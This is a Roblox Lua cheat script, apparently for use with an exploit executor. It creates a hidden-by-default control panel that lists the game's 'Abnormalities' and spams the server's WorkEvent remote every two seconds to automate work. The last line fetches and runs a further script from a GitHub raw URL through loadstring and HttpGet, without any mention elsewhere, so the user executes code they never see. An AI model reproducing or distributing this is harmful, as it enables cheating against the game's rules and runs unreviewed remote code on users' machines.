-- 创建主UI框架
local coGui = game:GetService("CoreGui")

-- 创建外部控制按钮的ScreenGui
local controlBtnGui = Instance.new("ScreenGui")
controlBtnGui.Name = "ControlButtonGui"
controlBtnGui.ResetOnSpawn = false
controlBtnGui.Parent = coGui

-- 外部控制按钮
local controlButton = Instance.new("TextButton")
controlButton.Name = "ControlButton"
controlButton.Text = "显示/隐藏控制面板"
controlButton.TextColor3 = Color3.fromRGB(255, 255, 255)
controlButton.TextSize = 16
controlButton.Font = Enum.Font.GothamBold
controlButton.Size = UDim2.new(0, 140, 0, 35)
controlButton.Position = UDim2.new(0.5, -75, 0, 20)  -- 顶部居中
controlButton.BackgroundColor3 = Color3.fromRGB(70, 70, 150)
controlButton.BorderSizePixel = 0
controlButton.AutoButtonColor = true
controlButton.Parent = controlBtnGui

-- 主UI的ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AbnormalityControl"
screenGui.ResetOnSpawn = false
screenGui.Enabled = false  -- 初始禁用
screenGui.Parent = coGui

-- 主框架
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0.8, 0, 0.8, 0)
mainFrame.Position = UDim2.new(0.1, 0, 0.15, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
mainFrame.BorderSizePixel = 0
mainFrame.ClipsDescendants = true
mainFrame.Parent = screenGui

-- 标题栏（用于拖动）
local titleBar = Instance.new("Frame")
titleBar.Name = "TitleBar"
titleBar.Size = UDim2.new(1, 0, 0.08, 0)
titleBar.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
titleBar.BorderSizePixel = 0
titleBar.Parent = mainFrame

local title = Instance.new("TextLabel")
title.Name = "Title"
title.Text = "异想体远程工作面板  by小爱"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 18
title.Font = Enum.Font.GothamBold
title.Size = UDim2.new(0.7, 0, 1, 0)
title.Position = UDim2.new(0.15, 0, 0, 0)
title.BackgroundTransparency = 1
title.Parent = titleBar

-- 控制按钮（隐藏/显示）
local toggleButton = Instance.new("TextButton")
toggleButton.Name = "ToggleButton"
toggleButton.Text = "隐藏"
toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
toggleButton.TextSize = 16
toggleButton.Font = Enum.Font.Gotham
toggleButton.Size = UDim2.new(0.2, 0, 1, 0)
toggleButton.Position = UDim2.new(0.8, 0, 0, 0)
toggleButton.BackgroundColor3 = Color3.fromRGB(70, 70, 100)
toggleButton.BorderSizePixel = 0
toggleButton.Parent = titleBar

-- 内容滚动区域
local scrollFrame = Instance.new("ScrollingFrame")
scrollFrame.Name = "Content"
scrollFrame.Size = UDim2.new(1, 0, 0.92, 0)
scrollFrame.Position = UDim2.new(0, 0, 0.08, 0)
scrollFrame.BackgroundTransparency = 1
scrollFrame.ScrollBarThickness = 6
scrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
scrollFrame.Parent = mainFrame

local uiListLayout = Instance.new("UIListLayout")
uiListLayout.Name = "ListLayout"
uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
uiListLayout.Padding = UDim.new(0, 10)
uiListLayout.Parent = scrollFrame

-- 模块模板（用于克隆）
local moduleTemplate = Instance.new("Frame")
moduleTemplate.Name = "ModuleTemplate"
moduleTemplate.Size = UDim2.new(0.95, 0, 0, 150)
moduleTemplate.Position = UDim2.new(0.025, 0, 0, 10)
moduleTemplate.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
moduleTemplate.BorderSizePixel = 0
moduleTemplate.Visible = false
moduleTemplate.Parent = scrollFrame

local nameLabel = Instance.new("TextLabel")
nameLabel.Name = "NameLabel"
nameLabel.Text = "异想体名称"
nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
nameLabel.TextSize = 18
nameLabel.Font = Enum.Font.GothamBold
nameLabel.Size = UDim2.new(1, 0, 0.2, 0)
nameLabel.Position = UDim2.new(0, 0, 0, 0)
nameLabel.BackgroundTransparency = 1
nameLabel.Parent = moduleTemplate

local buttonContainer = Instance.new("Frame")
buttonContainer.Name = "ButtonContainer"
buttonContainer.Size = UDim2.new(1, 0, 0.8, 0)
buttonContainer.Position = UDim2.new(0, 0, 0.2, 0)
buttonContainer.BackgroundTransparency = 1
buttonContainer.Parent = moduleTemplate

local gridLayout = Instance.new("UIGridLayout")
gridLayout.Name = "GridLayout"
gridLayout.CellSize = UDim2.new(0.45, 0, 0.45, 0)
gridLayout.CellPadding = UDim2.new(0.05, 0, 0.05, 0)
gridLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
gridLayout.VerticalAlignment = Enum.VerticalAlignment.Center
gridLayout.FillDirection = Enum.FillDirection.Horizontal
gridLayout.FillDirectionMaxCells = 2
gridLayout.Parent = buttonContainer

-- 创建四个工作类型按钮
local workTypes = {
    {Name = "本能", Type = "Instinct", Color = Color3.fromRGB(255, 0, 0)},
    {Name = "洞察", Type = "Insight", Color = Color3.fromRGB(230, 230, 230)},
    {Name = "沟通", Type = "Attachment", Color = Color3.fromRGB(128, 0, 128)},
    {Name = "压迫", Type = "Repression", Color = Color3.fromRGB(135, 206, 250)}
}

for _, workType in ipairs(workTypes) do
    local button = Instance.new("TextButton")
    button.Name = workType.Type
    button.Text = workType.Name
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.TextSize = 16
    button.Font = Enum.Font.Gotham
    button.Size = UDim2.new(1, 0, 1, 0)
    button.BackgroundColor3 = workType.Color
    button.BorderSizePixel = 0
    button.AutoButtonColor = false
    button.Parent = buttonContainer
    
    -- 按钮状态指示器
    local indicator = Instance.new("Frame")
    indicator.Name = "Indicator"
    indicator.Size = UDim2.new(0.05, 0, 0.05, 0)
    indicator.Position = UDim2.new(0.95, 0, 0.05, 0)
    indicator.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    indicator.BorderSizePixel = 0
    indicator.Visible = false
    indicator.Parent = button
end

-- 添加拖拽功能
local dragging = false
local dragInput, dragStart, frameStart

local function updateInput(input)
    local delta = input.Position - dragStart
    mainFrame.Position = UDim2.new(
        frameStart.X.Scale, 
        frameStart.X.Offset + delta.X,
        frameStart.Y.Scale, 
        frameStart.Y.Offset + delta.Y
    )
end

titleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        frameStart = mainFrame.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

titleBar.InputChanged:Connect(function(input)
    if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        dragInput = input
    end
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        updateInput(input)
    end
end)

-- 添加隐藏/显示功能（内部按钮）
toggleButton.MouseButton1Click:Connect(function()
    if mainFrame.Visible then
        mainFrame.Visible = false
        toggleButton.Text = "显示"
    else
        mainFrame.Visible = true
        toggleButton.Text = "隐藏"
    end
end)

-- 添加外部控制按钮功能
controlButton.MouseButton1Click:Connect(function()
    screenGui.Enabled = not screenGui.Enabled
    controlButton.Text = screenGui.Enabled and "隐藏控制面板" or "显示控制面板"
    
    -- 当显示UI时确保主框架可见
    if screenGui.Enabled then
        mainFrame.Visible = true
        toggleButton.Text = "隐藏"
    end
end)

-- 创建异想体控制模块
local function createAbnormalityModule(abnormality)
    local module = moduleTemplate:Clone()
    module.Name = abnormality.Name
    module.Visible = true
    module.LayoutOrder = #scrollFrame:GetChildren()
    module.Parent = scrollFrame
    
    -- 设置异想体名称
    module.NameLabel.Text = abnormality.Name
    
    -- 按钮互斥逻辑
    local activeButton = nil
    local timers = {}
    
    local function activateButton(button)
        -- 如果点击的是已激活按钮，则取消激活
        if activeButton == button then
            button.Indicator.Visible = false
            button.BackgroundTransparency = 0.2
            
            -- 停止定时器
            if timers[button] then
                timers[button]:Disconnect()
                timers[button] = nil
            end
            
            activeButton = nil
            return
        end
        
        -- 停用之前激活的按钮
        if activeButton then
            activeButton.Indicator.Visible = false
            activeButton.BackgroundTransparency = 0.2
            
            -- 停止定时器
            if timers[activeButton] then
                timers[activeButton]:Disconnect()
                timers[activeButton] = nil
            end
        end
        
        -- 激活新按钮
        button.Indicator.Visible = true
        button.BackgroundTransparency = 0
        activeButton = button
        
        -- 发送工作请求
        local workType = button.Name
        local args = {
            abnormality:WaitForChild("WorkTablet"),
            workType
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Assets"):WaitForChild("RemoteEvents"):WaitForChild("WorkEvent"):FireServer(unpack(args))
        
        -- 设置定时器
        timers[button] = game:GetService("RunService").Heartbeat:Connect(function()
            -- 每2秒执行一次
            if os.clock() % 2 < 0.1 then
                local success, err = pcall(function()
                    args = {
                        abnormality:WaitForChild("WorkTablet"),
                        workType
                    }
                    game:GetService("ReplicatedStorage").Assets.RemoteEvents.WorkEvent:FireServer(unpack(args))
                end)
                
                if not success then
                    print("执行工作请求时出错:", err)
                    if activeButton == button then
                        button.Indicator.Visible = false
                        button.BackgroundTransparency = 0.2
                        activeButton = nil
                        timers[button]:Disconnect()
                        timers[button] = nil
                    end
                end
            end
        end)
    end
    
    -- 绑定按钮事件
    for _, button in ipairs(module.ButtonContainer:GetChildren()) do
        if button:IsA("TextButton") then
            button.BackgroundTransparency = 0.2
            button.Indicator.Visible = false
            
            button.MouseButton1Click:Connect(function()
                activateButton(button)
            end)
        end
    end
end

-- 初始化所有异想体模块
local function initializeAbnormalities()
    -- 清除现有模块（除了模板）
    for _, child in ipairs(scrollFrame:GetChildren()) do
        if child:IsA("Frame") and child.Name ~= "ModuleTemplate" then
            child:Destroy()
        end
    end
    
    -- 获取所有异想体
    local abnormalitiesFolder = workspace:WaitForChild("Abnormalities")
    for _, abnormality in ipairs(abnormalitiesFolder:GetChildren()) do
        if abnormality:IsA("Model") and abnormality:FindFirstChild("WorkTablet") then
            createAbnormalityModule(abnormality)
        end
    end
end

-- 监听异想体变化
workspace:WaitForChild("Abnormalities").ChildAdded:Connect(initializeAbnormalities)
workspace:WaitForChild("Abnormalities").ChildRemoved:Connect(initializeAbnormalities)

initializeAbnormalities()
loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaoxiaoxin222/78scripts/refs/heads/main/%E8%84%91%E5%8F%B6%E4%BC%A0%E9%80%81.lua"))()
